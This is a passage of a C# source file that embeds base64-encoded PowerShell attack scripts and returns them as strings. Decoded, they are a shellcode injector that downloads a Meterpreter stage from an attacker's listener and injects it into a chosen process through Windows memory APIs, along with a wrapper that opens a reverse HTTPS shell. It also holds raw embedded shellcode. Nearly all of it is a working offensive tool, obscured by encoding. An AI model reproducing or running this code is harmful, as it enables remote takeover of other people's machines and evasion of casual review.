b2NhdGlvbk5hbWUpIHtgbiIgKyAkTXlJbnZvY2F0aW9uLk15Q29tbWFuZC5TY3JpcHRCbG9jayArICJgbn1gbiQoJFJvb3RJbnZvY2F0aW9uKSAtRm9yY2VgbmBuIg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAkQ29tbWFuZEJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6QXNjaWkuR2V0Qnl0ZXMoJENvbW1hbmQpDQogICAgICAgICAgICAkRW5jb2RlZENvbW1hbmQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRDb21tYW5kQnl0ZXMpDQoNCiAgICAgICAgICAgICRFeGVjdXRlID0gJyRDb21tYW5kJyArICIgfCAkRW52OndpbmRpclxTeXNXT1c2NFxXaW5kb3dzUG93ZXJTaGVsbFx2MS4wXHBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLUNvbW1hbmQgLSINCiAgICAgICAgICAgIEludm9rZS1FeHByZXNzaW9uIC1Db21tYW5kICRFeGVjdXRlIHwgT3V0LU51bGwNCg0KICAgICAgICAgICAgIyBFeGl0IHRoZSBzY3JpcHQgc2luY2UgdGhlIHNoZWxsY29kZSB3aWxsIGJlIHJ1bm5pbmcgZnJvbSB4ODYgUG93ZXJTaGVsbA0KICAgICAgICAgICAgUmV0dXJuDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgICRSZXNwb25zZSA9ICRUcnVlDQogICAgICAgIA0KICAgICAgICBpZiAoICRGb3JjZSAtb3IgKCAkUmVzcG9uc2UgPSAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICJEbyB5b3Uga25vdyB3aGF0IHlvdSdyZSBkb2luZz8iLA0KICAgICAgICAgICAgICAgIkFib3V0IHRvIGRvd25sb2FkIE1ldGFzcGxvaXQgcGF5bG9hZCAnJCgkUGF5bG9hZCknIExIT1NUPSQoJExob3N0KSwgTFBPUlQ9JCgkTHBvcnQpIiApICkgKSB7IH0NCiAgICAgICAgDQogICAgICAgIGlmICggISRSZXNwb25zZSApDQogICAgICAgIHsNCiAgICAgICAgICAgICMgVXNlciBvcHRlZCBub3QgdG8gY2Fycnkgb3V0IGRvd25sb2FkIG9mIE1ldGFzcGxvaXQgcGF5bG9hZC4gRXhpdCBmdW5jdGlvbg0KICAgICAgICAgICAgUmV0dXJuDQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHN3aXRjaCAoJFBheWxvYWQpDQogICAgICAgIHsNCiAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkU1NMID0gJycNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIA0KICAgICAgICAgICAgJ3dpbmRvd3MvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV9odHRwcycNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAkU1NMID0gJ3MnDQogICAgICAgICAgICAgICAgIyBBY2NlcHQgaW52YWxpZCBjZXJ0aWZpY2F0ZXMNCiAgICAgICAgICAgICAgICBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JFRydWV9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIGlmICgkTGVnYWN5KSANCiAgICAgICAgew0KICAgICAgICAgICAgIyBPbGQgTWV0ZXJwcmV0ZXIgaGFuZGxlciBleHBlY3RzICdJTklUTScgaW4gdGhlIFVSSSBpbiBvcmRlciB0byBpbml0aWF0ZSBzdGFnZSAwDQogICAgICAgICAgICAkUmVxdWVzdCA9ICJodHRwJCgkU1NMKTovLyQoJExob3N0KTokKCRMcG9ydCkvSU5JVE0iDQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJSZXF1ZXN0aW5nIG1ldGVycHJldGVyIHBheWxvYWQgZnJvbSAkUmVxdWVzdCINCiAgICAgICAgfSBlbHNlIHsNCg0KICAgICAgICAgICAgIyBHZW5lcmF0ZSBhIFVSSSB0aGF0IHBhc3NlcyB0aGUgdGVzdA0KICAgICAgICAgICAgJENoYXJBcnJheSA9IDQ4Li41NyArIDY1Li45MCArIDk3Li4xMjIgfCBGb3JFYWNoLU9iamVjdCB7W0NoYXJdJF99DQogICAgICAgICAgICAkU3VtVGVzdCA9ICRGYWxzZQ0KDQogICAgICAgICAgICB3aGlsZSAoJFN1bVRlc3QgLWVxICRGYWxzZSkgDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgJEdlbmVyYXRlZFVyaSA9ICRDaGFyQXJyYXkgfCBHZXQtUmFuZG9tIC1Db3VudCA0DQogICAgICAgICAgICAgICAgJFN1bVRlc3QgPSAoKFtpbnRbXV0gJEdlbmVyYXRlZFVyaSB8IE1lYXN1cmUtT2JqZWN0IC1TdW0pLlN1bSAlIDB4MTAwIC1lcSA5MikNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgJFJlcXVlc3RVcmkgPSAtam9pbiAkR2VuZXJhdGVkVXJpDQoNCiAgICAgICAgICAgICRSZXF1ZXN0ID0gImh0dHAkKCRTU0wpOi8vJCgkTGhvc3QpOiQoJExwb3J0KS8kKCRSZXF1ZXN0VXJpKSIgDQogICAgICAgIH0NCiAgICAgICAgICAgDQogICAgICAgICRVcmkgPSBOZXctT2JqZWN0IFVyaSgkUmVxdWVzdCkNCiAgICAgICAgJFdlYkNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQNCiAgICAgICAgJFdlYkNsaWVudC5IZWFkZXJzLkFkZCgndXNlci1hZ2VudCcsICIkVXNlckFnZW50IikNCiAgICAgICAgDQogICAgICAgIGlmICgkUHJveHkpDQogICAgICAgIHsNCiAgICAgICAgICAgICRXZWJQcm94eU9iamVjdCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJQcm94eQ0KICAgICAgICAgICAgJFByb3h5QWRkcmVzcyA9IChHZXQtSXRlbVByb3BlcnR5IC1QYXRoICdIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxJbnRlcm5ldCBTZXR0aW5ncycpLlByb3h5U2VydmVyDQogICAgICAgICAgICANCiAgICAgICAgICAgICMgaWYgdGhlcmUgaXMgbm8gcHJveHkgc2V0LCB0aGVuIGNvbnRpbnVlIHdpdGhvdXQgaXQNCiAgICAgICAgICAgIGlmICgkUHJveHlBZGRyZXNzKSANCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICRXZWJQcm94eU9iamVjdC5BZGRyZXNzID0gJFByb3h5QWRkcmVzcw0KICAgICAgICAgICAgICAgICRXZWJQcm94eU9iamVjdC5Vc2VEZWZhdWx0Q3JlZGVudGlhbHMgPSAkVHJ1ZQ0KICAgICAgICAgICAgICAgICRXZWJDbGllbnRPYmplY3QuUHJveHkgPSAkV2ViUHJveHlPYmplY3QNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHRyeQ0KICAgICAgICB7DQogICAgICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSAkV2ViQ2xpZW50LkRvd25sb2FkRGF0YSgkVXJpKQ0KICAgICAgICB9DQogICAgICAgIGNhdGNoDQogICAgICAgIHsNCiAgICAgICAgICAgIFRocm93ICIkKCRFcnJvclswXS5FeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uSW5uZXJFeGNlcHRpb24uTWVzc2FnZSkiDQogICAgICAgIH0NCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gJFNoZWxsY29kZTMyDQoNCiAgICB9DQogICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NoZWxsY29kZSddKQ0KICAgIHsNCiAgICAgICAgIyBVc2VycyBwYXNzaW5nIGluIHNoZWxsY29kZSAgdGhyb3VnaCB0aGUgJy1TaGVsbGNvZGUnIHBhcmFtZXRlciBhcmUgcmVzcG9uc2libGUgZm9yIGVuc3VyaW5nIGl0IHRhcmdldHMNCiAgICAgICAgIyB0aGUgY29ycmVjdCBhcmNoaXRlY2h0dXJlIC0geDg2IHZzLiB4NjQuIFRoaXMgc2NyaXB0IGhhcyBubyB3YXkgdG8gdmFsaWRhdGUgd2hhdCB5b3UgcHJvdmlkZSBpdC4NCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gJFNoZWxsY29kZQ0KICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlNjQgPSAkU2hlbGxjb2RlMzINCiAgICB9DQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgIyBQb3AgYSBjYWxjLi4uIG9yIHdoYXRldmVyIHNoZWxsY29kZSB5b3UgZGVjaWRlIHRvIHBsYWNlIGluIGhlcmUNCiAgICAgICAgIyBJIHNpbmNlcmVseSBob3BlIHlvdSB0cnVzdCB0aGF0IHRoaXMgc2hlbGxjb2RlIGFjdHVhbGx5IHBvcHMgYSBjYWxjLi4uDQogICAgICAgICMgSW5zZXJ0IHlvdXIgc2hlbGxjb2RlIGhlcmUgaW4gdGhlIGZvciAweFhYLDB4WFgsLi4uDQogICAgICAgICMgMzItYml0IHBheWxvYWQNCiAgICAgICAgIyBtc2ZwYXlsb2FkIHdpbmRvd3MvZXhlYyBDTUQ9ImNtZCAvayBjYWxjIiBFWElURlVOQz10aHJlYWQNCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gQCgweGZjLDB4ZTgsMHg4OSwweDAwLDB4MDAsMHgwMCwweDYwLDB4ODksMHhlNSwweDMxLDB4ZDIsMHg2NCwweDhiLDB4NTIsMHgzMCwweDhiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTIsMHgwYywweDhiLDB4NTIsMHgxNCwweDhiLDB4NzIsMHgyOCwweDBmLDB4YjcsMHg0YSwweDI2LDB4MzEsMHhmZiwweDMxLDB4YzAsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweGMxLDB4Y2YsMHgwZCwweDAxLDB4YzcsMHhlMiwweGYwLDB4NTIsMHg1NywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NTIsMHgxMCwweDhiLDB4NDIsMHgzYywweDAxLDB4ZDAsMHg4YiwweDQwLDB4NzgsMHg4NSwweGMwLDB4NzQsMHg0YSwweDAxLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ZDAsMHg1MCwweDhiLDB4NDgsMHgxOCwweDhiLDB4NTgsMHgyMCwweDAxLDB4ZDMsMHhlMywweDNjLDB4NDksMHg4YiwweDM0LDB4OGIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGQ2LDB4MzEsMHhmZiwweDMxLDB4YzAsMHhhYywweGMxLDB4Y2YsMHgwZCwweDAxLDB4YzcsMHgzOCwweGUwLDB4NzUsMHhmNCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAzLDB4N2QsMHhmOCwweDNiLDB4N2QsMHgyNCwweDc1LDB4ZTIsMHg1OCwweDhiLDB4NTgsMHgyNCwweDAxLDB4ZDMsMHg2NiwweDhiLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MGMsMHg0YiwweDhiLDB4NTgsMHgxYywweDAxLDB4ZDMsMHg4YiwweDA0LDB4OGIsMHgwMSwweGQwLDB4ODksMHg0NCwweDI0LDB4MjQsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1YiwweDViLDB4NjEsMHg1OSwweDVhLDB4NTEsMHhmZiwweGUwLDB4NTgsMHg1ZiwweDVhLDB4OGIsMHgxMiwweGViLDB4ODYsMHg1ZCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDZhLDB4MDEsMHg4ZCwweDg1LDB4YjksMHgwMCwweDAwLDB4MDAsMHg1MCwweDY4LDB4MzEsMHg4YiwweDZmLDB4ODcsMHhmZiwweGQ1LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4YmIsMHhlMCwweDFkLDB4MmEsMHgwYSwweDY4LDB4YTYsMHg5NSwweGJkLDB4OWQsMHhmZiwweGQ1LDB4M2MsMHgwNiwweDdjLDB4MGEsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4MCwweGZiLDB4ZTAsMHg3NSwweDA1LDB4YmIsMHg0NywweDEzLDB4NzIsMHg2ZiwweDZhLDB4MDAsMHg1MywweGZmLDB4ZDUsMHg2MywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDYxLDB4NmMsMHg2MywweDAwKQ0KDQogICAgICAgICMgNjQtYml0IHBheWxvYWQNCiAgICAgICAgIyBtc2ZwYXlsb2FkIHdpbmRvd3MveDY0L2V4ZWMgQ01EPSJjYWxjIiBFWElURlVOQz10aHJlYWQNCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTY0ID0gQCgweGZjLDB4NDgsMHg4MywweGU0LDB4ZjAsMHhlOCwweGMwLDB4MDAsMHgwMCwweDAwLDB4NDEsMHg1MSwweDQxLDB4NTAsMHg1MiwweDUxLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTYsMHg0OCwweDMxLDB4ZDIsMHg2NSwweDQ4LDB4OGIsMHg1MiwweDYwLDB4NDgsMHg4YiwweDUyLDB4MTgsMHg0OCwweDhiLDB4NTIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgyMCwweDQ4LDB4OGIsMHg3MiwweDUwLDB4NDgsMHgwZiwweGI3LDB4NGEsMHg0YSwweDRkLDB4MzEsMHhjOSwweDQ4LDB4MzEsMHhjMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGFjLDB4M2MsMHg2MSwweDdjLDB4MDIsMHgyYywweDIwLDB4NDEsMHhjMSwweGM5LDB4MGQsMHg0MSwweDAxLDB4YzEsMHhlMiwweGVkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTIsMHg0MSwweDUxLDB4NDgsMHg4YiwweDUyLDB4MjAsMHg4YiwweDQyLDB4M2MsMHg0OCwweDAxLDB4ZDAsMHg4YiwweDgwLDB4ODgsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDAwLDB4MDAsMHg0OCwweDg1LDB4YzAsMHg3NCwweDY3LDB4NDgsMHgwMSwweGQwLDB4NTAsMHg4YiwweDQ4LDB4MTgsMHg0NCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NDAsMHgyMCwweDQ5LDB4MDEsMHhkMCwweGUzLDB4NTYsMHg0OCwweGZmLDB4YzksMHg0MSwweDhiLDB4MzQsMHg4OCwweDQ4LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkNiwweDRkLDB4MzEsMHhjOSwweDQ4LDB4MzEsMHhjMCwweGFjLDB4NDEsMHhjMSwweGM5LDB4MGQsMHg0MSwweDAxLDB4YzEsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgzOCwweGUwLDB4NzUsMHhmMSwweDRjLDB4MDMsMHg0YywweDI0LDB4MDgsMHg0NSwweDM5LDB4ZDEsMHg3NSwweGQ4LDB4NTgsMHg0NCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDhiLDB4NDAsMHgyNCwweDQ5LDB4MDEsMHhkMCwweDY2LDB4NDEsMHg4YiwweDBjLDB4NDgsMHg0NCwweDhiLDB4NDAsMHgxYywweDQ5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkMCwweDQxLDB4OGIsMHgwNCwweDg4LDB4NDgsMHgwMSwweGQwLDB4NDEsMHg1OCwweDQxLDB4NTgsMHg1ZSwweDU5LDB4NWEsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg0MSwweDU4LDB4NDEsMHg1OSwweDQxLDB4NWEsMHg0OCwweDgzLDB4ZWMsMHgyMCwweDQxLDB4NTIsMHhmZiwweGUwLDB4NTgsMHg0MSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDU5LDB4NWEsMHg0OCwweDhiLDB4MTIsMHhlOSwweDU3LDB4ZmYsMHhmZiwweGZmLDB4NWQsMHg0OCwweGJhLDB4MDEsMHgwMCwweDAwLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQ4LDB4OGQsMHg4ZCwweDAxLDB4MDEsMHgwMCwweDAwLDB4NDEsMHhiYSwweDMxLDB4OGIsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2ZiwweDg3LDB4ZmYsMHhkNSwweGJiLDB4ZTAsMHgxZCwweDJhLDB4MGEsMHg0MSwweGJhLDB4YTYsMHg5NSwweGJkLDB4OWQsMHhmZiwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGQ1LDB4NDgsMHg4MywweGM0LDB4MjgsMHgzYywweDA2LDB4N2MsMHgwYSwweDgwLDB4ZmIsMHhlMCwweDc1LDB4MDUsMHhiYiwweDQ3LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTMsMHg3MiwweDZmLDB4NmEsMHgwMCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNSwweDYzLDB4NjEsMHg2YywweDYzLDB4MDApDQogICAgfQ0KDQogICAgaWYgKCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb2Nlc3NJRCddICkNCiAgICB7DQogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBzcGVjaWZpZWQgcHJvY2VzcyBJRA0KICAgICAgICAkT3BlblByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBPcGVuUHJvY2Vzcw0KICAgICAgICAkT3BlblByb2Nlc3NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbVUludDMyXSwgW0Jvb2xdLCBbVUludDMyXSkgKFtJbnRQdHJdKQ0KICAgICAgICAkT3BlblByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkT3BlblByb2Nlc3NBZGRyLCAkT3BlblByb2Nlc3NEZWxlZ2F0ZSkNCiAgICAgICAgJFZpcnR1YWxBbGxvY0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jRXgNCiAgICAgICAgJFZpcnR1YWxBbGxvY0V4RGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVWludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pDQogICAgICAgICRWaXJ0dWFsQWxsb2NFeCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NFeEFkZHIsICRWaXJ0dWFsQWxsb2NFeERlbGVnYXRlKQ0KICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV3JpdGVQcm9jZXNzTWVtb3J5DQogICAgICAgICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtCeXRlW11dLCBbVUludDMyXSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQ0KICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5ID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJFdyaXRlUHJvY2Vzc01lbW9yeUFkZHIsICRXcml0ZVByb2Nlc3NNZW1vcnlEZWxlZ2F0ZSkNCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENyZWF0ZVJlbW90ZVRocmVhZA0KICAgICAgICAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbSW50UHRyXSkNCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRDcmVhdGVSZW1vdGVUaHJlYWRBZGRyLCAkQ3JlYXRlUmVtb3RlVGhyZWFkRGVsZWdhdGUpDQogICAgICAgICRDbG9zZUhhbmRsZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENsb3NlSGFuZGxlDQogICAgICAgICRDbG9zZUhhbmRsZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdKSAoW0Jvb2xdKQ0KICAgICAgICAkQ2xvc2VIYW5kbGUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ2xvc2VIYW5kbGVBZGRyLCAkQ2xvc2VIYW5kbGVEZWxlZ2F0ZSkNCiAgICANCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbnRvIFBJRDogJFByb2Nlc3NJZCINCiAgICAgICAgDQogICAgICAgIGlmICggJEZvcmNlIC1vciAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICdEbyB5b3Ugd2lzaCB0byBjYXJyeSBvdXQgeW91ciBldmlsIHBsYW5zPycsDQogICAgICAgICAgICAgICAgICJJbmplY3Rpbmcgc2hlbGxjb2RlIGluamVjdGluZyBpbnRvICQoKEdldC1Qcm9jZXNzIC1JZCAkUHJvY2Vzc0lkKS5Qcm9jZXNzTmFtZSkgKCRQcm9jZXNzSWQpISIgKSApDQogICAgICAgIHsNCiAgICAgICAgICAgIEluamVjdC1SZW1vdGVTaGVsbGNvZGUgJFByb2Nlc3NJZA0KICAgICAgICB9DQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgICAgICMgSW5qZWN0IHNoZWxsY29kZSBpbnRvIHRoZSBjdXJyZW50bHkgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3MNCiAgICAgICAgJFZpcnR1YWxBbGxvY0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvYw0KICAgICAgICAkVmlydHVhbEFsbG9jRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkNCiAgICAgICAgJFZpcnR1YWxBbGxvYyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsQWxsb2NBZGRyLCAkVmlydHVhbEFsbG9jRGVsZWdhdGUpDQogICAgICAgICRWaXJ0dWFsRnJlZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxGcmVlDQogICAgICAgICRWaXJ0dWFsRnJlZURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVWludDMyXSwgW1VJbnQzMl0pIChbQm9vbF0pDQogICAgICAgICRWaXJ0dWFsRnJlZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRWaXJ0dWFsRnJlZUFkZHIsICRWaXJ0dWFsRnJlZURlbGVnYXRlKQ0KICAgICAgICAkQ3JlYXRlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ3JlYXRlVGhyZWFkDQogICAgICAgICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdLCBbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0ludFB0cl0pDQogICAgICAgICRDcmVhdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlVGhyZWFkQWRkciwgJENyZWF0ZVRocmVhZERlbGVnYXRlKQ0KICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdhaXRGb3JTaW5nbGVPYmplY3QNCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludDMyXSkgKFtJbnRdKQ0KICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXYWl0Rm9yU2luZ2xlT2JqZWN0QWRkciwgJFdhaXRGb3JTaW5nbGVPYmplY3REZWxlZ2F0ZSkNCiAgICAgICAgDQogICAgICAgIFdyaXRlLVZlcmJvc2UgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byBQb3dlclNoZWxsIg0KICAgICAgICANCiAgICAgICAgaWYgKCAkRm9yY2UgLW9yICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggJ0RvIHlvdSB3aXNoIHRvIGNhcnJ5IG91dCB5b3VyIGV2aWwgcGxhbnM/JywNCiAgICAgICAgICAgICAgICAgIkluamVjdGluZyBzaGVsbGNvZGUgaW50byB0aGUgcnVubmluZyBQb3dlclNoZWxsIHByb2Nlc3MhIiApICkNCiAgICAgICAgew0KICAgICAgICAgICAgSW5qZWN0LUxvY2FsU2hlbGxjb2RlDQogICAgICAgIH0NCiAgICB9ICAgDQp9"));
            return PSInvoke_Shellcode;
        }
        public static string Invoke_Meterpreter()
        {
            string PSInvoke_Invoke_Meterpreter = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@"ZnVuY3Rpb24gSW52b2tlLU1ldGVycHJldGVyDQp7DQoJcGFyYW0gKA0KCSAgIFtzdHJpbmddJExIb3N0ICA9ICQodGhyb3cgIi1MSG9zdCBpcyByZXF1aXJlZC4iKSwNCgkgICBbc3RyaW5nXSRMUG9ydCA9ICQodGhyb3cgIi1MUG9ydCBpcyByZXF1aXJlZC4iKQ0KCSkNCg0KCVdyaXRlLUhvc3QgIiINCglXcml0ZS1Ib3N0ICJPdXIgTWV0ZXJwcmV0ZXIgTGlzdGVuZXIgSVA6ICIgLU5vTmV3bGluZSANCglXcml0ZS1Ib3N0ICRMSG9zdCANCglXcml0ZS1Ib3N0ICIiDQoJV3JpdGUtSG9zdCAiIg0KCVdyaXRlLUhvc3QgIk91ciBNZXRlcnByZXRlciBMaXN0ZW5lciBQb3J0OiAiIC1Ob05ld2xpbmUgDQoJV3JpdGUtSG9zdCAkTFBvcnQgDQoJV3JpdGUtSG9zdCAiIg0KCVdyaXRlLUhvc3QgIkxldCdzIHNldHVwIGEgU2hlbGwgOikiDQoJSW52b2tlLVNoZWxsY29kZSAtUGF5bG9hZCB3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cHMgLUxob3N0ICRMSG9zdCAtTHBvcnQgJExQb3J0IC1Gb3JjZQ0KfQ=="));
            return PSInvoke_Invoke_Meterpreter;
        }
        public static string Show_TargetScreen()
        {
            string PSInvoke_Show_TargetScreen = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(@""));
            return PSInvoke_Show_TargetScreen;
        }
    }
}
